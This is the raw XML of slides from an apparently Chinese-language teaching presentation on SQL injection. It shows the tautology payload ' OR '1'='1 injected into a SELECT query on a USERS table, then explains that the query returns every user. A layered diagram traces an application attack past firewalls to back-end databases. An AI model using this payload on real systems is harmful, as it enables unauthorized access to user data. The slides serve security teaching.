                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>’</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF3300"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t> OR 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/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>‘</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF33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/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>’</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF3300"/>
                </a:solidFill>
                <a:ea typeface="宋体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FF3300"/>
                </a:solidFill>
                <a:latin typeface="Tahoma" panose="020B0604030504040204"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>‘</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF3300"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>1</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>应用程序构造查询语句：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SELECT * FROM USERS WHERE SSN=‘</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF3300"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>1234’ OR ‘1’=‘1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0">
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>’</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>结果返回数据库中的每一个用户</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="436228" name="AutoShape 4"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="5191125" y="3840163"/>
            <a:ext cx="1582738" cy="719137"/>
          </a:xfrm>
          <a:prstGeom prst="wedgeRectCallout">
            <a:avLst>
              <a:gd name="adj1" fmla="val -244483"/>
              <a:gd name="adj2" fmla="val 159713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2000" b="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>永真逻辑！</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1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endParaRPr lang="en-US" altLang="zh-CN" sz="2400" b="1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6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6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4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36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36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SQL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>注入攻击流程</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="437252" name="Rectangle 4"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="228600" y="914400"/>
            <a:ext cx="5715000" cy="2579688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</a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" anchorCtr="1"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" eaLnBrk="0" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
            </a:pPr>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="9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37253" name="Line 5"/>
          <p:cNvSpPr>
            <a:spLocks noChangeShapeType="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm flipH="1">
            <a:off x="4495800" y="2943225"/>
            <a:ext cx="1066800" cy="0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54" name="Rectangle 6"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="228600" y="3668713"/>
            <a:ext cx="5715000" cy="2579687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</a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" anchorCtr="1"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" eaLnBrk="0" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
            </a:pPr>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="16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37255" name="Line 7"/>
          <p:cNvSpPr>
            <a:spLocks noChangeShapeType="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="765175" y="5057775"/>
            <a:ext cx="1090613" cy="0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56" name="Line 8"/>
          <p:cNvSpPr>
            <a:spLocks noChangeShapeType="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1009650" y="3001963"/>
            <a:ext cx="1588" cy="2055812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57" name="AutoShape 9"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm rot="-318816">
            <a:off x="1311275" y="4887913"/>
            <a:ext cx="139700" cy="342900"/>
          </a:xfrm>
          <a:prstGeom prst="parallelogram">
            <a:avLst>
              <a:gd name="adj" fmla="val 56324"/>
            </a:avLst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7258" name="Line 10"/>
          <p:cNvSpPr>
            <a:spLocks noChangeShapeType="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm flipV="1">
            <a:off x="1330325" y="4946650"/>
            <a:ext cx="49213" cy="258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59" name="Line 11"/>
          <p:cNvSpPr>
            <a:spLocks noChangeShapeType="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm flipV="1">
            <a:off x="1379538" y="4946650"/>
            <a:ext cx="50800" cy="258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60" name="Rectangle 12"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="ltGray">
          <a:xfrm rot="16200000" flipH="1">
            <a:off x="889000" y="5230813"/>
            <a:ext cx="1631950" cy="228600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="CC33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3630600" prstMaterial="legacyPlastic">
            <a:bevelT w="13500" h="13500" prst="angle"/>
            <a:bevelB w="13500" h="13500" prst="angle"/>
            <a:extrusionClr>
              <a:srgbClr val="CC33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ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>Firewall</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="437261" name="AutoShape 13"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm rot="5400000">
            <a:off x="1609725" y="4935538"/>
            <a:ext cx="668337" cy="153988"/>
          </a:xfrm>
          <a:prstGeom prst="can">
            <a:avLst>
              <a:gd name="adj" fmla="val 36056"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFF00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7262" name="Line 14"/>
          <p:cNvSpPr>
            <a:spLocks noChangeShapeType="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1968500" y="5043488"/>
            <a:ext cx="2063750" cy="14287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63" name="Freeform 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="gray">
          <a:xfrm>
            <a:off x="1073150" y="2979738"/>
            <a:ext cx="511175" cy="1927225"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:cxnLst>
              <a:cxn ang="0">
                <a:pos x="68" y="0"/>
              </a:cxn>
              <a:cxn ang="0">
                <a:pos x="68" y="775"/>
              </a:cxn>
              <a:cxn ang="0">
                <a:pos x="479" y="980"/>
              </a:cxn>
            </a:cxnLst>
            <a:rect l="0" t="0" r="r" b="b"/>
            <a:pathLst>
              <a:path w="479" h="980">
                <a:moveTo>
                  <a:pt x="68" y="0"/>
                </a:moveTo>
                <a:cubicBezTo>
                  <a:pt x="33" y="304"/>
                  <a:pt x="0" y="612"/>
                  <a:pt x="68" y="775"/>
                </a:cubicBezTo>
                <a:cubicBezTo>
                  <a:pt x="136" y="938"/>
                  <a:pt x="393" y="937"/>
                  <a:pt x="479" y="980"/>
                </a:cubicBezTo>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:noFill/>
          <a:ln w="101600" cap="flat" cmpd="sng">
            <a:solidFill>
              <a:srgbClr val="FF0000">
                <a:alpha val="60001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64" name="Line 16"/>
          <p:cNvSpPr>
            <a:spLocks noChangeShapeType="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2989263" y="4414838"/>
            <a:ext cx="0" cy="601662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65" name="AutoShape 17"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2801938" y="4356100"/>
            <a:ext cx="388937" cy="515938"/>
          </a:xfrm>
          <a:prstGeom prst="can">
            <a:avLst>
              <a:gd name="adj" fmla="val 33163"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFF00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7266" name="Rectangle 18"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="ltGray">
          <a:xfrm>
            <a:off x="2368550" y="4489450"/>
            <a:ext cx="1227138" cy="268288"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="CC33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CC33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ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>Hardened OS</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="437267" name="Rectangle 19"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="ltGray">
          <a:xfrm>
            <a:off x="2354263" y="4156075"/>
            <a:ext cx="1228725" cy="268288"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="CC33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CC33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ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>Web Server</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="437268" name="Rectangle 20"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="ltGray">
          <a:xfrm>
            <a:off x="2354263" y="3813175"/>
            <a:ext cx="1228725" cy="268288"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="CC33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CC33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ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>App Server</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="437269" name="AutoShape 21"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2801938" y="3554413"/>
            <a:ext cx="385762" cy="171450"/>
          </a:xfrm>
          <a:prstGeom prst="can">
            <a:avLst>
              <a:gd name="adj" fmla="val 36056"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFF00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7270" name="Line 22"/>
          <p:cNvSpPr>
            <a:spLocks noChangeShapeType="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm flipH="1">
            <a:off x="2995613" y="3233738"/>
            <a:ext cx="1587" cy="388937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71" name="Rectangle 23"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="ltGray">
          <a:xfrm rot="16200000" flipH="1">
            <a:off x="3292475" y="5203825"/>
            <a:ext cx="1631950" cy="228600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="CC33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3630600" prstMaterial="legacyPlastic">
            <a:bevelT w="13500" h="13500" prst="angle"/>
            <a:bevelB w="13500" h="13500" prst="angle"/>
            <a:extrusionClr>
              <a:srgbClr val="CC33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ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>Firewall</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="437272" name="AutoShape 24"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm rot="5400000">
            <a:off x="4012407" y="4933156"/>
            <a:ext cx="666750" cy="150813"/>
          </a:xfrm>
          <a:prstGeom prst="can">
            <a:avLst>
              <a:gd name="adj" fmla="val 36056"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFF00"/>
          </a:solidFill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7273" name="Line 25"/>
          <p:cNvSpPr>
            <a:spLocks noChangeShapeType="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm flipV="1">
            <a:off x="4362450" y="5053013"/>
            <a:ext cx="1033463" cy="1587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74" name="Rectangle 26"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="ltGray">
          <a:xfrm rot="16200000">
            <a:off x="3846513" y="2063750"/>
            <a:ext cx="1371600" cy="139700"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="6699FF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6699FF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Databases</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="437275" name="Rectangle 27"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="ltGray">
          <a:xfrm rot="16200000">
            <a:off x="4044950" y="2063750"/>
            <a:ext cx="1371600" cy="139700"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="6699FF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6699FF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Legacy Systems</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="437276" name="Rectangle 28"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="ltGray">
          <a:xfrm rot="16200000">
            <a:off x="4243388" y="2063750"/>
            <a:ext cx="1371600" cy="139700"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="6699FF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6699FF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Web Services</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="437277" name="Rectangle 29"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="ltGray">
          <a:xfrm rot="16200000">
            <a:off x="4441825" y="2063750"/>
            <a:ext cx="1371600" cy="139700"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="6699FF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6699FF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Directories</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="437278" name="Rectangle 30"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="ltGray">
          <a:xfrm rot="16200000">
            <a:off x="4641057" y="2064543"/>
            <a:ext cx="1371600" cy="138113"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="6699FF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6699FF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Human Resrcs</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="437279" name="Rectangle 31"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="ltGray">
          <a:xfrm rot="16200000">
            <a:off x="4840288" y="2063750"/>
            <a:ext cx="1371600" cy="139700"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="6699FF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6699FF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Billing</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="437280" name="Line 32"/>
          <p:cNvSpPr>
            <a:spLocks noChangeShapeType="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm flipH="1">
            <a:off x="5099050" y="2971800"/>
            <a:ext cx="6350" cy="2090738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81" name="Rectangle 33"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="ltGray">
          <a:xfrm>
            <a:off x="2252663" y="2800350"/>
            <a:ext cx="1455737" cy="260350"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="008000"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:miter lim="800000"/>
          </a:ln>
          <a:effectLst/>
          <a:scene3d>
            <a:camera prst="legacyPerspectiveTopRight">
              <a:rot lat="420000" lon="0" rev="0"/>
            </a:camera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0080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ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>Custom Code</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="437282" name="Picture 34" descr="TN_hacker"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1" noChangeArrowheads="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3" cstate="print">
            <a:lum bright="24000" contrast="42000"/>
          </a:blip>
          <a:srcRect/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="627063" y="1409700"/>
            <a:ext cx="1209675" cy="1462088"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="437283" name="Freeform 35"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="gray">
          <a:xfrm>
            <a:off x="3049588" y="3001963"/>
            <a:ext cx="935037" cy="2041525"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:cxnLst>
              <a:cxn ang="0">
                <a:pos x="68" y="0"/>
              </a:cxn>
              <a:cxn ang="0">
                <a:pos x="135" y="1375"/>
              </a:cxn>
              <a:cxn ang="0">
                <a:pos x="876" y="1551"/>
              </a:cxn>
            </a:cxnLst>
            <a:rect l="0" t="0" r="r" b="b"/>
            <a:pathLst>
              <a:path w="876" h="1633">
                <a:moveTo>
                  <a:pt x="68" y="0"/>
                </a:moveTo>
                <a:cubicBezTo>
                  <a:pt x="78" y="229"/>
                  <a:pt x="0" y="1117"/>
                  <a:pt x="135" y="1375"/>
                </a:cubicBezTo>
                <a:cubicBezTo>
                  <a:pt x="270" y="1633"/>
                  <a:pt x="722" y="1514"/>
                  <a:pt x="876" y="1551"/>
                </a:cubicBezTo>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:noFill/>
          <a:ln w="101600" cap="flat" cmpd="sng">
            <a:solidFill>
              <a:srgbClr val="FF9900">
                <a:alpha val="60001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84" name="Freeform 36"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="gray">
          <a:xfrm flipH="1">
            <a:off x="1968500" y="3001963"/>
            <a:ext cx="955675" cy="2041525"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:cxnLst>
              <a:cxn ang="0">
                <a:pos x="68" y="0"/>
              </a:cxn>
              <a:cxn ang="0">
                <a:pos x="135" y="1375"/>
              </a:cxn>
              <a:cxn ang="0">
                <a:pos x="876" y="1551"/>
              </a:cxn>
            </a:cxnLst>
            <a:rect l="0" t="0" r="r" b="b"/>
            <a:pathLst>
              <a:path w="876" h="1633">
                <a:moveTo>
                  <a:pt x="68" y="0"/>
                </a:moveTo>
                <a:cubicBezTo>
                  <a:pt x="78" y="229"/>
                  <a:pt x="0" y="1117"/>
                  <a:pt x="135" y="1375"/>
                </a:cubicBezTo>
                <a:cubicBezTo>
                  <a:pt x="270" y="1633"/>
                  <a:pt x="722" y="1514"/>
                  <a:pt x="876" y="1551"/>
                </a:cubicBezTo>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:noFill/>
          <a:ln w="101600" cap="flat" cmpd="sng">
            <a:solidFill>
              <a:srgbClr val="FF0000">
                <a:alpha val="60001"/>
              </a:srgbClr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85" name="Freeform 37"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="gray">
          <a:xfrm flipH="1">
            <a:off x="4375150" y="3048000"/>
            <a:ext cx="658813" cy="1968500"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:cxnLst>
              <a:cxn ang="0">
                <a:pos x="68" y="0"/>
              </a:cxn>
              <a:cxn ang="0">
                <a:pos x="135" y="1375"/>
              </a:cxn>
              <a:cxn ang="0">
                <a:pos x="876" y="1551"/>
              </a:cxn>
            </a:cxnLst>
            <a:rect l="0" t="0" r="r" b="b"/>
            <a:pathLst>
              <a:path w="876" h="1633">
                <a:moveTo>
                  <a:pt x="68" y="0"/>
                </a:moveTo>
                <a:cubicBezTo>
                  <a:pt x="78" y="229"/>
                  <a:pt x="0" y="1117"/>
                  <a:pt x="135" y="1375"/>
                </a:cubicBezTo>
                <a:cubicBezTo>
                  <a:pt x="270" y="1633"/>
                  <a:pt x="722" y="1514"/>
                  <a:pt x="876" y="1551"/>
                </a:cubicBezTo>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:noFill/>
          <a:ln w="101600" cap="flat" cmpd="sng">
            <a:solidFill>
              <a:srgbClr val="FF9900">
                <a:alpha val="60001"/>
              </a:srgbClr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437286" name="Text Box 38"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="white">
          <a:xfrm>
            <a:off x="576263" y="2355850"/>
            <a:ext cx="1260475" cy="365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APPLICATION</a:t>
            </a:r>
            <a:b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ATTACK</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="437287" name="Text Box 39"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm rot="16200000">
            <a:off x="-344487" y="4838700"/>
            <a:ext cx="1455737" cy="284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ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>Network Layer </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="437288" name="Text Box 40"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm rot="16200000">
            <a:off x="-450056" y="2080419"/>
            <a:ext cx="1670050" cy="2841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ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>Application Layer</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="437289" name="Rectangle 41"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="ltGray">
          <a:xfrm rot="16200000">
            <a:off x="1674019" y="2043906"/>
            <a:ext cx="1316038" cy="123825"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0080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0080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Accounts</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="437290" name="Rectangle 42"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="ltGray">
          <a:xfrm rot="16200000">
            <a:off x="1857375" y="2043113"/>
            <a:ext cx="1316038" cy="125412"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0080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0080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Finance</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="437291" name="Rectangle 43"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="ltGray">
          <a:xfrm rot="16200000">
            <a:off x="2053432" y="2043906"/>
            <a:ext cx="1316038" cy="123825"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0080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0080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Administration</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="437292" name="Rectangle 44"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
